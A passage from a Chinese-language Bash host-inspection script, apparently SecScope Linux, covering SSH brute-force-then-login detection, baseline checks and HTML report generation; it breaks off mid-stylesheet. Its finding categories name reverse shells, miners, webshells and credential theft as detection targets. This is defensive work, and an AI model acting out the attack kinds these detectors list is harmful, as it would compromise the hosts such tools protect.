                for (i=1; i<NF; i++) if ($i=="from") { ip=$(i+1); break }
                if (ip!="" && failed[ip]>100) print ip " | " $0
            }' | tail -5)
        if [ -n "$brute_success" ]; then
            emit_find "CRITICAL" "SSH 同源爆破后成功登录 — 可能已失陷" \
                "$brute_success" \
                "1. 立即隔离会话  2. 核查登录账户和来源  3. 重置相关凭据"
            record_find "CRITICAL" "attack_chain" "SSH爆破→同源登录" "$brute_success" "立即处置" "T1110.001"
        fi
    fi

    log_info "攻击模式匹配完成"
}

#==============================================================================
# 12 — 配置安全基线
#==============================================================================

check_baseline() {
    echo ""
    echo -e "${BOLD}${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${BOLD}${MAGENTA}  [12/12] 安全基线速查${NC}"
    echo -e "${BOLD}${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"

    # 强制访问控制按发行版判断：Ubuntu/Debian/openSUSE 默认关注 AppArmor，
    # RHEL 系关注 SELinux，避免仅因安装了 getenforce 就在 Ubuntu 上产生误报。
    case "$OS_ID" in
        ubuntu|debian|kali|opensuse*|sles)
            local apparmor_enabled=false
            if command -v aa-status >/dev/null 2>&1; then
                aa-status --enabled >/dev/null 2>&1 && apparmor_enabled=true
            elif [ -d /sys/module/apparmor ] && [ "$(cat /sys/module/apparmor/parameters/enabled 2>/dev/null)" = "Y" ]; then
                apparmor_enabled=true
            fi
            if [ "$apparmor_enabled" = true ]; then
                echo "  AppArmor: Enabled"
            else
                emit_find "MEDIUM" "AppArmor 未启用或状态不可确认" \
                    "发行版=${OS_ID}; aa-status=$(command -v aa-status >/dev/null 2>&1 && echo available || echo unavailable)" \
                    "确认内核 AppArmor 状态并启用适合业务的强制访问控制策略"
                record_find "MEDIUM" "baseline" "AppArmor 未启用" "发行版=${OS_ID}; 状态=disabled-or-unknown" \
                    "启用并配置 AppArmor" "" "BAS-APPARMOR-DISABLED" "apparmor" \
                    "mandatory_access_control.txt,module-baseline.log"
            fi
            ;;
        centos|rhel|fedora|rocky|almalinux|ol|tencentos|anolis)
            if command -v getenforce >/dev/null 2>&1; then
                local selinux_status=$(getenforce 2>/dev/null)
                echo "  SELinux: ${selinux_status}"
                if [ "$selinux_status" != "Enforcing" ]; then
                    emit_find "MEDIUM" "SELinux 未处于 Enforcing 模式" \
                        "当前状态: ${selinux_status}" "将 SELinux 设置为 Enforcing"
                    record_find "MEDIUM" "baseline" "SELinux 未开启" "状态: ${selinux_status}" "启用 Enforcing" "" \
                        "BAS-SELINUX-NOT-ENFORCING" "selinux" "mandatory_access_control.txt,module-baseline.log"
                fi
            else
                mark_current_module_partial "getenforce_unavailable"
            fi
            ;;
    esac

    # 密码策略
    echo -e "\n  ${BOLD}密码策略 (/etc/login.defs):${NC}"
    grep -E '^PASS_MAX_DAYS|^PASS_MIN_DAYS|^PASS_WARN_AGE|^PASS_MIN_LEN' /etc/login.defs 2>/dev/null | while read line; do echo "    $line"; done

    local pass_max=$(grep '^PASS_MAX_DAYS' /etc/login.defs 2>/dev/null | awk '{print $2}')
    if [ -n "$pass_max" ] && [ "$pass_max" -gt 90 ]; then
        emit_find "MEDIUM" "密码最大有效期过长: ${pass_max}天" \
            "PASS_MAX_DAYS=${pass_max}" "建议设为 90 天"
        record_find "MEDIUM" "baseline" "密码有效期过长" "PASS_MAX_DAYS=${pass_max}" "设为90天" "" \
            "BAS-PASSWORD-MAX-DAYS" "password-max-days" "login_defs.txt,module-baseline.log"
    fi

    # 核心 dump
    local core_limit=$(ulimit -c 2>/dev/null)
    echo -e "  Core dump 限制: ${core_limit}"
    [ "$core_limit" != "0" ] && emit_find "LOW" "Core dump 未禁用 (ulimit -c: ${core_limit})" \
        "core dump 可能泄漏敏感信息" "ulimit -c 0" && record_find "LOW" "baseline" "Core dump 未禁用" "ulimit -c: ${core_limit}" "禁用" ""

    dump_raw "mandatory_access_control.txt" bash -c '
        printf "OS_ID=%s\n" "$1"
        command -v getenforce >/dev/null 2>&1 && { printf "SELinux="; getenforce 2>/dev/null; }
        if command -v aa-status >/dev/null 2>&1; then aa-status 2>&1; elif [ -r /sys/module/apparmor/parameters/enabled ]; then printf "AppArmor="; cat /sys/module/apparmor/parameters/enabled; else echo "AppArmor=unavailable"; fi
    ' _ "$OS_ID"
    dump_raw "login_defs.txt" grep -E '^[[:space:]]*(PASS_MAX_DAYS|PASS_MIN_DAYS|PASS_WARN_AGE|PASS_MIN_LEN)[[:space:]]+' /etc/login.defs

    # Kubernetes 控制面关键参数。只根据实际进程命令行判断，不改写集群配置。
    if [ "$HOST_ROLE" = "kubernetes" ]; then
        local apiserver_cmd
        apiserver_cmd=$(ps -eo args= 2>/dev/null | grep -E '(^|[[:space:]])kube-apiserver([[:space:]]|$)' | grep -v grep | head -1)
        if printf '%s' "$apiserver_cmd" | grep -qiE -- '--anonymous-auth(=|[[:space:]])true'; then
            emit_find "HIGH" "Kubernetes API Server 允许匿名认证" \
                "kube-apiserver 有效启动参数包含 --anonymous-auth=true" \
                "核对匿名访问需求和 RBAC；无明确需求时设置为 false"
            record_find "HIGH" "baseline" "Kubernetes API Server 允许匿名认证" \
                "kube-apiserver 有效启动参数包含 --anonymous-auth=true" \
                "核对匿名访问需求和 RBAC，建议禁用" "" \
                "BAS-K8S-ANON-AUTH" "kube-apiserver-anonymous-auth" "ps_auxww.txt,systemd_services.txt"
        fi
    fi

    # /etc/hosts 检查
    echo -e "\n  ${BOLD}/etc/hosts:${NC}"
    safe_read /etc/hosts | grep -v '^#' | grep -v '^$' | while read line; do echo "    $line"; done

    # /etc/resolv.conf 是否被篡改
    local dns=$(grep '^nameserver' /etc/resolv.conf 2>/dev/null | awk '{print $2}')
    local unusual_dns=()
    for ns in $dns; do
        is_trusted_dns "$ns" && continue
        unusual_dns+=("$ns")
    done
    if [ "${#unusual_dns[@]}" -gt 0 ]; then
        emit_find "MEDIUM" "DNS 服务器指向非标准地址" \
            "${unusual_dns[*]}" \
            "检查是否为已知的企业 DNS 或运营商 DNS，否则可能被篡改"
        record_find "MEDIUM" "baseline" "非标准 DNS" "${unusual_dns[*]}" "核实 DNS 配置" ""
    fi

    log_info "安全基线检查完成"
}

#==============================================================================
# 报告生成
#==============================================================================
# HTML 可视化报告
#==============================================================================

generate_html_report() {
    local verdict="$1"
    local total=$((SEVERITY_CRITICAL + SEVERITY_HIGH + SEVERITY_MEDIUM + SEVERITY_LOW))

    sev_class() {
        case "$1" in CRITICAL) echo "severity-critical" ;; HIGH) echo "severity-high" ;; MEDIUM) echo "severity-medium" ;; LOW) echo "severity-low" ;; OBSERVE) echo "severity-observe" ;; *) echo "" ;; esac
    }
    sev_label() {
        severity_label "$1"
    }
    cat_label() {
        case "$1" in
            rootkit)       echo "Rootkit" ;;
            reversesh*)    echo "反弹Shell" ;;
            miner)         echo "挖矿" ;;
            rat)           echo "RAT / Loader" ;;
            webshell)      echo "Webshell" ;;
            backdoor)      echo "后门" ;;
            credential)    echo "凭证窃取" ;;
            authentication) echo "认证行为" ;;
            attack_chain)  echo "攻击链" ;;
            persistence)   echo "持久化" ;;
            injection)     echo "代码注入" ;;
            process)       echo "异常进程" ;;
            network)       echo "网络" ;;
            users)         echo "用户" ;;
            filesystem)    echo "文件系统" ;;
            config)        echo "配置异常" ;;
            baseline)      echo "安全基线" ;;
            history)       echo "命令历史" ;;
            logs)          echo "日志" ;;
            kernel)        echo "内核" ;;
            supplychain)   echo "供应链" ;;
            *)             echo "$1" ;;
        esac
    }
    # 原始文件链接说明
    raw_file_for() {
        local category="$1" summary="$2"
        case "$category" in
            rootkit|injection)    echo "lsmod.txt, proc_modules.txt, kernel_tainted.txt" ;;
            reversesh*|network)   echo "ss_listen.txt, ss_established.txt" ;;
            miner|process)        echo "ps_auxww.txt, proc/" ;;
            rat)                  echo "rat-findings.jsonl, rat-evidence-graph.json, binary-analysis.jsonl" ;;
            webshell|filesystem)  echo "tmp_executables.txt, module-filesystem.log" ;;
            persistence)          echo "crontab_all.txt, systemd_services.txt" ;;
            users)                echo "passwd.txt, sudoers_all.txt, sshd_config.txt, authorized_keys.txt" ;;
            credential)           echo "ps_auxww.txt, audit_auth_exec_events.txt" ;;
            authentication)       echo "ssh_success_events.txt, auth_log_excerpt.txt, last_logins.txt, audit_auth_exec_events.txt" ;;
            history)              echo "shell_history.txt, audit_auth_exec_events.txt" ;;
            kernel)               echo "dmesg_tail.txt, kernel_tainted.txt, lsmod.txt, proc_modules.txt" ;;
            baseline)
                case "$summary" in
                    SSH*) echo "sshd_config.txt, passwd.txt" ;;
                    Privileged*) echo "docker_security.txt, running_services.txt" ;;
                    Kubernetes*) echo "ps_auxww.txt, systemd_services.txt" ;;
                    *) echo "module-baseline.log, system_info.txt" ;;
                esac
                ;;
            logs|attack_chain)    echo "auth_log_excerpt.txt, last_logins.txt, lastb_logins.txt" ;;
            backdoor)             echo "lsmod.txt, ld_preload_config.txt" ;;
            *)                    echo "system_info.txt, ps_auxww.txt" ;;
        esac
    }
    raw_refs_html() {
        local refs="$1" ref html="" href label
        local -a ref_items=()
        IFS=',' read -r -a ref_items <<< "$refs"
        for ref in "${ref_items[@]}"; do
            ref=$(printf '%s' "$ref" | sed -E 's/^[[:space:]]+//;s/[[:space:]]+$//')
            [ -n "$ref" ] || continue
            label=$(html_esc "$ref")
            href="raw/${ref}"
            if [ -e "${RAW_DIR}/${ref%/}" ]; then
                html="${html}${html:+, }<a href=\"$(html_esc "$href")\">${label}</a>"
            else
                html="${html}${html:+, }<span class=\"raw-missing\">${label}（未采集）</span>"
            fi
        done
        printf '%s' "$html"
    }

    # 分离威胁发现和基线发现
    local threat_rows=""
    local anomaly_rows=""
    local baseline_rows=""
    local trust_rows=""
    local observation_rows=""
    local change_rows=""
    local threat_critical=0 threat_high=0 threat_medium=0 threat_low=0
    local base_critical=0 base_high=0 base_medium=0 base_low=0
    local change_shown=0 idx
    while IFS= read -r idx; do
        [ -n "$idx" ] || continue
        local sev="${FINDING_SEVS[$idx]}"
        local cat="${FINDING_CATS[$idx]}"
        local sum="${FINDING_SUMMARIES[$idx]}"
        local evd="${FINDING_EVIDENCES[$idx]}"
        local rec="${FINDING_RECOMMENDATIONS[$idx]}"
        local mit="${FINDING_MITRES[$idx]}"
        local lifecycle="${FINDING_LIFECYCLES[$idx]}"
        local finding_type="${FINDING_TYPES[$idx]:-SECURITY_THREAT}"
        if [ "$RUN_MODE" = Hunt ]; then case "$finding_type" in CONFIG_BASELINE|SOFTWARE_TRUST_GAP|RUNTIME_OBSERVATION) continue ;; esac; fi
        local confidence="${FINDING_CONFIDENCES[$idx]:-MEDIUM}"
        local judgment_basis="${FINDING_JUDGMENT_BASES[$idx]}"
        local escalation_conditions="${FINDING_ESCALATION_CONDITIONS[$idx]}"
        local evidence_domains="${FINDING_EVIDENCE_DOMAINS[$idx]:-}"
        local domain_count="${FINDING_DOMAIN_COUNTS[$idx]:-0}"
        local counter_evidence="${FINDING_COUNTER_EVIDENCE[$idx]:-未记录}"
        local finding_timeline="${FINDING_TIMELINES[$idx]:-}"
        judgment_basis="${judgment_basis}；独立证据域=${evidence_domains:-无}（${domain_count} 个）。"
        escalation_conditions="${escalation_conditions}；反证/降级因素：${counter_evidence}。"
        local cls=$(sev_class "$sev")
        local lbl=$(severity_label "$sev")
        local clabel=$(cat_label "$cat")
        local section="threat"
        case "$finding_type" in SECURITY_ANOMALY) section="anomaly" ;; CONFIG_BASELINE) section="baseline" ;; SOFTWARE_TRUST_GAP) section="trust" ;; RUNTIME_OBSERVATION) section="observation" ;; esac
        local raw_ref="${FINDING_RAW_REFS[$idx]}"
        [ -n "$raw_ref" ] || raw_ref=$(raw_file_for "$cat" "$sum")
        local raw_ref_html=$(raw_refs_html "$raw_ref")
        # 先截断原文再做 HTML 转义，避免截断到实体编码中间。
        local sum_short="$sum"
        [ "${#sum_short}" -gt 80 ] && sum_short="${sum_short:0:80}..."
        sum_short=$(html_esc "$sum_short")
        evd=$(html_esc "$(redact_text "${evd}${finding_timeline:+$'\n--- 攻击链时间线 ---\n'}${finding_timeline}")")
        rec=$(html_esc "$rec")

        local row_html search_text severity_key
        severity_key=$(printf '%s' "$sev" | tr '[:upper:]' '[:lower:]')
        search_text=$(html_esc "$sev $confidence $finding_type $lifecycle $sum ${FINDING_RULE_IDS[$idx]} ${FINDING_MODULES[$idx]} $cat")
        local evidence_id="evidence-${idx}"
        row_html="$(printf '<tr class="row-%s finding-row" data-search-item="1" data-section="%s" data-severity="%s" data-confidence="%s" data-search="%s"><td class="col-sev"><span class="tag tag-%s">%s</span></td><td class="col-sum"><span class="life">%s</span> %s</td><td><span class="confidence confidence-%s">%s可信</span></td><td class="col-cat"><span class="cat-label cat-%s">%s</span></td><td class="col-act"><button type="button" class="evidence-toggle" data-target="%s">查看证据</button></td></tr><tr id="%s" class="evidence-row" hidden><td colspan="5"><div class="evidence-layout"><div><div class="dp-label">证据</div><pre>%s</pre><div class="dp-label">判断依据</div><p>%s</p><div class="dp-label">升级条件</div><p>%s</p></div><div><div class="dp-label">处置建议</div><p>%s</p><div class="dp-label">规则 / 指纹</div><code>%s / %s</code><div class="dp-label">首次 / 最近 / 次数</div><code>%s / %s / %s</code><div class="dp-label">模块 / MITRE</div><code>%s / %s</code><div class="dp-label">相关原始数据</div><span class="raw-ref">%s</span></div></div></td></tr>' "$cls" "$section" "$severity_key" "$(printf '%s' "$confidence" | tr '[:upper:]' '[:lower:]')" "$search_text" "$cls" "$lbl" "$(html_esc "$(lifecycle_label "$lifecycle")")" "$sum_short" "$(printf '%s' "$confidence" | tr '[:upper:]' '[:lower:]')" "$(html_esc "$(confidence_label "$confidence")")" "$cat" "$clabel" "$evidence_id" "$evidence_id" "$evd" "$(html_esc "$judgment_basis")" "$(html_esc "$escalation_conditions")" "$rec" "$(html_esc "${FINDING_RULE_IDS[$idx]}")" "$(html_esc "${FINDING_FINGERPRINTS[$idx]:0:16}")" "$(html_esc "${FINDING_FIRST_SEEN[$idx]}")" "$(html_esc "${FINDING_LAST_SEEN[$idx]}")" "${FINDING_OCCURRENCES[$idx]}" "$(html_esc "${FINDING_MODULES[$idx]}")" "${mit:-N/A}" "$raw_ref_html")"

        case "$lifecycle" in
            ONGOING|BASELINE_EXISTING) ;;
            *)
                if [ "$change_shown" -lt 10 ]; then
                    change_rows+="$(printf '<tr data-search-item="1" data-section="changes" data-severity="%s"><td><span class="life">%s</span></td><td>%s</td><td><span class="tag tag-%s">%s</span></td></tr>' "$severity_key" "$(html_esc "$(lifecycle_label "$lifecycle")")" "$sum_short" "$cls" "$lbl")"
                    change_shown=$((change_shown + 1))
                fi
                ;;
        esac

        case "$finding_type" in
            CONFIG_BASELINE) baseline_rows+="$row_html"; case "$sev" in CRITICAL) base_critical=$((base_critical+1));; HIGH) base_high=$((base_high+1));; MEDIUM) base_medium=$((base_medium+1));; LOW) base_low=$((base_low+1));; esac ;;
            SECURITY_ANOMALY) anomaly_rows+="$row_html" ;;
            SOFTWARE_TRUST_GAP) trust_rows+="$row_html" ;;
            RUNTIME_OBSERVATION) observation_rows+="$row_html" ;;
            *) threat_rows+="$row_html"; case "$sev" in CRITICAL) threat_critical=$((threat_critical+1));; HIGH) threat_high=$((threat_high+1));; MEDIUM) threat_medium=$((threat_medium+1));; LOW) threat_low=$((threat_low+1));; esac ;;
        esac
    done < <(sorted_finding_indices)
    local n
    for n in "${!RESOLVED_FPS[@]}"; do
        [ "$change_shown" -lt 10 ] || break
        local resolved_key resolved_cls resolved_label
        resolved_key=$(printf '%s' "${RESOLVED_SEVS[$n]}" | tr '[:upper:]' '[:lower:]')
        resolved_cls=$(sev_class "${RESOLVED_SEVS[$n]}")
        resolved_label=$(severity_label "${RESOLVED_SEVS[$n]}")
        change_rows+="$(printf '<tr data-search-item="1" data-section="changes" data-severity="%s"><td><span class="life resolved">已恢复</span></td><td>%s</td><td><span class="tag tag-%s">%s</span></td></tr>' "$resolved_key" "$(html_esc "${RESOLVED_SUMMARIES[$n]}")" "$resolved_cls" "$resolved_label")"
        change_shown=$((change_shown + 1))
    done

    local module_rows="" module_idx module_error module_log module_status_class
    for module_idx in "${!MODULE_IDS[@]}"; do
        module_error="${MODULE_ERRORS[$module_idx]:--}"
        [ -n "$module_error" ] || module_error="-"
        module_log="module-${MODULE_IDS[$module_idx]}.log"
        module_status_class=$(printf '%s' "${MODULE_STATUSES[$module_idx]}" | tr '[:upper:]' '[:lower:]')
        module_rows+="$(printf '<tr data-search-item="1" data-section="modules"><td><code>%s</code></td><td>%s</td><td><span class="mod-status mod-%s">%s</span></td><td>%s 秒</td><td>%s · <a href="raw/%s">日志</a></td></tr>' \
            "$(html_esc "${MODULE_IDS[$module_idx]}")" "$(html_esc "${MODULE_NAMES[$module_idx]}")" "$module_status_class" "$(html_esc "$(module_status_label "${MODULE_STATUSES[$module_idx]}")")" \
            "${MODULE_DURATIONS[$module_idx]}" "$(html_esc "$module_error")" "$(html_esc "$module_log")")"
    done
    [ -n "$module_rows" ] || module_rows='<tr><td colspan="5"><div class="empty-state">无模块状态</div></td></tr>'
    local module_table_html="<table class=\"tbl\"><thead><tr><th>编号</th><th>模块</th><th>状态</th><th>耗时</th><th>错误或缺失数据源</th></tr></thead><tbody>${module_rows}</tbody></table>"

    local endpoint_rows="" priority_rows="" raw_rows="" product_idx priority_idx raw_file raw_rel
    for product_idx in "${!ENDPOINT_NAMES[@]}"; do
        endpoint_rows+="$(printf '<tr data-search-item="1" data-section="endpoint"><td>%s</td><td>%s</td><td>%s</td><td>%s</td></tr>' \
            "$(html_esc "${ENDPOINT_NAMES[$product_idx]}")" "$(html_esc "${ENDPOINT_STATUSES[$product_idx]}")" \
            "$(html_esc "${ENDPOINT_DETAILS[$product_idx]}")" "$(html_esc "${ENDPOINT_SOURCES[$product_idx]}")")"
    done
    [ -n "$endpoint_rows" ] || endpoint_rows='<tr><td colspan="4"><div class="empty-state">未从本机服务识别到终端安全产品，请确认云安全或 EDR 覆盖情况</div></td></tr>'
    for priority_idx in "${!PRIORITY_KEYS[@]}"; do
        priority_rows+="$(printf '<tr data-search-item="1" data-section="priority"><td>%s</td><td>%s</td><td>%s</td></tr>' \
            "$(html_esc "${PRIORITY_ITEMS[$priority_idx]}")" "$(html_esc "${PRIORITY_STATUSES[$priority_idx]}")" "$(html_esc "${PRIORITY_RECOMMENDATIONS[$priority_idx]}")")"
    done
    [ -n "$priority_rows" ] || priority_rows='<tr><td colspan="3"><div class="empty-state">本轮没有额外的运维优先处理建议</div></td></tr>'
    while IFS= read -r raw_file; do
        raw_rel="${raw_file#${RAW_DIR}/}"
        raw_rows+="$(printf '<li data-search-item="1" data-section="raw"><a href="raw/%s">%s</a></li>' "$(html_esc "$raw_rel")" "$(html_esc "$raw_rel")")"
    done < <(find "$RAW_DIR" -type f 2>/dev/null | LC_ALL=C sort)
    raw_rows+='<li data-search-item="1" data-section="raw"><a href="raw/manifest.json">manifest.json（完成后生成）</a></li><li data-search-item="1" data-section="raw"><a href="raw/manifest.sha256">manifest.sha256（完成后生成）</a></li>'
    [ -n "$raw_rows" ] || raw_rows='<li class="empty-state">暂无原始证据文件</li>'

    # 生成统计条
    gen_stat_bar() {
        local c="$1" h="$2" m="$3" l="$4"
        echo "<div class=\"stat-bar\">"
        echo "<div class=\"st st-critical\"><span class=\"st-num\">${c}</span><span class=\"st-text\">严重</span></div>"
        echo "<div class=\"st st-high\"><span class=\"st-num\">${h}</span><span class=\"st-text\">高危</span></div>"
        echo "<div class=\"st st-medium\"><span class=\"st-num\">${m}</span><span class=\"st-text\">中危</span></div>"
        echo "<div class=\"st st-low\"><span class=\"st-num\">${l}</span><span class=\"st-text\">低危</span></div>"
        echo "</div>"
    }

    # 威胁等级与扫描完整性分别判定；覆盖不足时不得显示普通未发现。
    local v_cls="clean" v_text=""
    if [ "$threat_critical" -gt 0 ]; then
        v_cls="critical"
        v_text="威胁指标 — ${threat_critical} 个严重 / ${threat_high} 个高危 / 基线 ${base_critical} 个严重"
    elif [ "$threat_high" -gt 0 ]; then
        v_cls="warn"
        v_text="需确认 — ${threat_high} 个高危威胁 / 基线 ${base_high} 个高危配置"
    elif [ "$threat_medium" -gt 0 ]; then
        v_cls="warn"
        v_text="关注 — ${threat_medium} 个中危威胁项"
    elif scan_visibility_incomplete; then
        v_cls="warn"
        v_text="扫描不完整 — 当前结果为 PARTIAL/INCONCLUSIVE，不能判定未发现威胁"
    else
        v_cls="clean"
        v_text="未发现明显威胁指标"
        if [ "$base_critical" -gt 0 ]; then
            v_text="${v_text}，${base_critical} 个严重配置问题需修复"
        elif [ "$base_high" -gt 0 ]; then
            v_text="${v_text}，${base_high} 个高危配置基线建议修复"
        fi
    fi
    if [ "$threat_critical" -gt 0 ] || [ "$threat_high" -gt 0 ] || [ "$threat_medium" -gt 0 ]; then
        scan_visibility_incomplete && v_text="${v_text}；扫描覆盖为 PARTIAL/INCONCLUSIVE"
    fi

    cat > "$HTML_FILE" <<'HTM'
<!doctype html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>SecScope Linux 报告 — HOSTNAME_PLACEHOLDER</title><style>
*{box-sizing:border-box}body{margin:0;background:#f2f4f6;color:#27313a;font:14px -apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif}.topbar{background:#202733;color:#fff;padding:20px 28px}.topline{display:flex;justify-content:space-between;gap:18px;align-items:flex-start}.topbar h1{font-size:21px;margin:0 0 7px}.meta{color:#b8c2cc;font-size:12px;line-height:1.7}.verdict-tag{padding:8px 12px;border-radius:6px;font-weight:700;white-space:nowrap}.verdict-tag.critical{background:#a93226}.verdict-tag.warn{background:#b65c12}.verdict-tag.clean{background:#287a4b}.wrap{max-width:1320px;margin:auto;padding:18px}.overview{display:grid;grid-template-columns:repeat(4,minmax(0,1fr));gap:10px;margin-bottom:14px}.overview-card{background:#fff;border:1px solid #e2e7eb;border-radius:9px;padding:12px;min-width:0}.overview-card span{display:block;color:#75818a;font-size:11px;margin-bottom:4px}.overview-card b{display:block;overflow-wrap:anywhere}.integrity-note{background:#fff8e6;border:1px solid #e7c86d;border-left:4px solid #c28a00;border-radius:8px;padding:10px 13px;margin-bottom:14px;color:#66510d}.integrity-note code{background:#fff;padding:1px 4px}.searchbox{display:flex;gap:8px;align-items:center;background:#fff;border:1px solid #e2e7eb;border-radius:9px;padding:10px;margin-bottom:14px;flex-wrap:wrap}.searchbox input{flex:1;min-width:180px}.searchbox input,.searchbox select,.searchbox button,.evidence-toggle{border:1px solid #cbd4da;border-radius:6px;background:#fff;padding:8px 10px;font:inherit}.search-result{font-size:12px;color:#75818a;white-space:nowrap}.section{background:#fff;border:1px solid #e2e7eb;border-radius:10px;padding:16px;margin-bottom:14px}.section-hd{display:flex;gap:8px;align-items:center;margin-bottom:10px}.section-hd h2{font-size:17px;margin:0}.badge{font-size:11px;padding:2px 7px;border-radius:8px;color:#fff}.badge.threat{background:#b94a3b}.badge.baseline{background:#6f7d86}.hint{color:#75818a;font-size:12px;margin:-3px 0 10px}.stat-bar,.change-stats{display:grid;grid-template-columns:repeat(4,minmax(0,1fr));gap:8px;margin-bottom:12px}.change-stats{grid-template-columns:repeat(5,minmax(0,1fr))}.st,.change-stat{background:#f8fafb;border-top:3px solid #87939c;padding:9px 12px;text-align:center;border-radius:6px}.st-num,.change-stat b{display:block;font-size:22px}.st-text{font-size:12px;color:#75818a}.st-critical{border-color:#c0392b}.st-high{border-color:#d35400}.st-medium{border-color:#d89b00}.st-low{border-color:#70917d}.table-wrap{width:100%;overflow-x:auto;border:1px solid #e7ebee;border-radius:7px}.tbl{width:100%;border-collapse:collapse;background:#fff}.tbl th,.tbl td{padding:9px 11px;border-bottom:1px solid #edf0f2;text-align:left;vertical-align:top}.tbl th{background:#f6f8f9;font-size:12px;color:#5d6870;white-space:nowrap}.col-sev{width:76px}.col-cat{width:105px}.col-act{width:92px}.tag,.confidence{display:inline-block;padding:2px 7px;border-radius:4px;font-size:11px;font-weight:700;white-space:nowrap}.tag-severity-critical{background:#fde8e8;color:#a92d2d}.tag-severity-high{background:#fcebd9;color:#ad4a0b}.tag-severity-medium{background:#fff3d6;color:#966400}.tag-severity-low{background:#eaf5ef;color:#257247}.tag-severity-observe{background:#edf1f4;color:#59666f}.confidence-high{background:#fde8e8;color:#a92d2d}.confidence-medium{background:#fff3d6;color:#966400}.confidence-low{background:#edf1f4;color:#59666f}.row-severity-critical td:first-child{border-left:3px solid #c0392b}.row-severity-high td:first-child{border-left:3px solid #d35400}.row-severity-medium td:first-child{border-left:3px solid #d89b00}.row-severity-low td:first-child,.row-severity-observe td:first-child{border-left:3px solid #87939c}.cat-label,.life{display:inline-block;padding:1px 5px;border-radius:3px;background:#edf1f4;color:#4f5d66;font-size:10px;font-weight:700}.life{background:#e8f1fb;color:#21618c}.life.resolved{background:#eaf5ef;color:#257247}.evidence-toggle{cursor:pointer;color:#2478a8;padding:4px 7px}.evidence-row td{background:#fafbfc;padding:14px}.evidence-layout{display:grid;grid-template-columns:minmax(0,3fr) minmax(260px,2fr);gap:18px}.evidence-layout pre{white-space:pre-wrap;word-break:break-word;max-height:280px;overflow:auto;background:#fff;border:1px solid #edf0f2;padding:8px}.dp-label{font-size:11px;color:#75818a;margin:10px 0 4px}.raw-ref a,.tbl a,.raw-list a{color:#2478a8;text-decoration:none}.raw-missing{color:#a93226}.mod-status{font-size:11px;font-weight:700}.mod-success{color:#257247}.mod-partial{color:#9b6700}.mod-failed{color:#ad2f2f}.section-fold>summary{font-size:16px;font-weight:700;color:#27313a}.section-fold[open]>summary{margin-bottom:12px}.raw-list{margin:0;padding:8px 8px 8px 28px;columns:3}.raw-list li{break-inside:avoid;margin:3px 0}.empty-state{text-align:center;padding:24px;color:#87939c}.footer{text-align:center;color:#87939c;font-size:11px;padding:8px}.hidden-by-filter{display:none!important}
@media(max-width:900px){.overview{grid-template-columns:repeat(2,minmax(0,1fr))}.searchbox{flex-wrap:wrap}.change-stats{grid-template-columns:repeat(3,minmax(0,1fr))}.raw-list{columns:2}}@media(max-width:600px){.topline{display:block}.verdict-tag{display:inline-block;margin-top:12px;white-space:normal}.overview{grid-template-columns:1fr}.stat-bar,.change-stats{grid-template-columns:repeat(2,minmax(0,1fr))}.searchbox input{width:100%}.detail-panel{width:520px}.raw-list{columns:1}}
/* SecScope operational report */
:root{--ink:#1f292f;--muted:#68767f;--line:#dce3e7;--soft:#f4f7f8;--paper:#fff;--critical:#b4232b;--high:#c65316;--medium:#a46d00;--low:#287552;--accent:#087f8c;--header:#20272b}html{scroll-behavior:smooth}html,body{width:100%;max-width:100%;overflow-x:hidden}body{background:var(--paper);color:var(--ink);line-height:1.55}.topbar{background:var(--header);border-bottom:4px solid var(--accent);padding:26px 30px}.topline{max-width:1380px;margin:auto;gap:28px;align-items:center}.brandline{display:flex;align-items:center;gap:14px}.brandmark{display:grid;place-items:center;width:42px;height:42px;border:1px solid #607078;border-radius:6px;color:#b9f0f2;font:bold 18px ui-monospace,SFMono-Regular,Consolas,monospace}.brand-kicker{color:#8ed6d9;font-size:11px;font-weight:800;letter-spacing:0;text-transform:uppercase}.topbar h1{font-size:25px;line-height:1.2;margin:2px 0 5px;letter-spacing:0}.meta{color:#c2ccd1;font-size:12px}.verdict-tag{max-width:430px;padding:10px 14px;border-radius:5px;border:1px solid rgba(255,255,255,.22);white-space:normal;text-align:right}.verdict-tag.clean{background:#1f754f}.verdict-tag.warn{background:#a65318}.verdict-tag.critical{background:#9f2730}.report-nav{background:#fff;border-bottom:1px solid var(--line);position:sticky;top:0;z-index:30;overflow-x:auto}.report-nav-inner{max-width:1380px;margin:auto;display:flex;gap:4px;padding:7px 22px;white-space:nowrap}.report-nav a{color:#43525a;text-decoration:none;font-size:12px;font-weight:700;padding:7px 9px;border-bottom:2px solid transparent}.report-nav a:hover,.report-nav a:focus{color:#086d77;border-color:var(--accent);outline:none}.wrap{max-width:1380px;padding:18px 22px 38px}.executive{display:grid;grid-template-columns:minmax(280px,1.35fr) repeat(3,minmax(150px,.65fr));border:1px solid var(--line);border-left:5px solid var(--accent);margin-bottom:14px;background:#fff}.executive-lead,.executive-metric{padding:15px 17px}.executive-metric{border-left:1px solid var(--line)}.executive-label{display:block;color:var(--muted);font-size:11px;font-weight:700;margin-bottom:4px}.executive-value{display:block;font-size:23px;line-height:1.2}.executive-lead .executive-value{font-size:16px}.executive-note{display:block;color:var(--muted);font-size:11px;margin-top:5px}.overview{grid-template-columns:repeat(4,minmax(0,1fr));gap:0;border:1px solid var(--line);margin-bottom:14px}.overview-card{border:0;border-right:1px solid var(--line);border-radius:0;padding:11px 14px;background:var(--soft)}.overview-card:last-child{border-right:0}.integrity-note{background:#fffaeb;border:1px solid #e5cf82;border-left:4px solid #a46d00;border-radius:3px;color:#5c4b16}.searchbox{position:sticky;top:46px;z-index:20;background:rgba(255,255,255,.98);border:1px solid var(--line);border-radius:4px;padding:9px 10px;margin-bottom:0;box-shadow:0 5px 14px rgba(31,41,47,.08);backdrop-filter:blur(6px)}.searchbox input,.searchbox select,.searchbox button,.evidence-toggle{border-color:#bfcbd1;border-radius:3px}.searchbox input:focus,.searchbox select:focus,.searchbox button:focus,.evidence-toggle:focus{outline:2px solid #54aeb5;outline-offset:1px}.section{border:0;border-bottom:1px solid var(--line);border-radius:0;padding:25px 2px;margin:0;box-shadow:none;min-width:0;scroll-margin-top:106px}.section-hd{justify-content:space-between;border-left:4px solid var(--accent);padding-left:10px;margin-bottom:12px}.section-hd 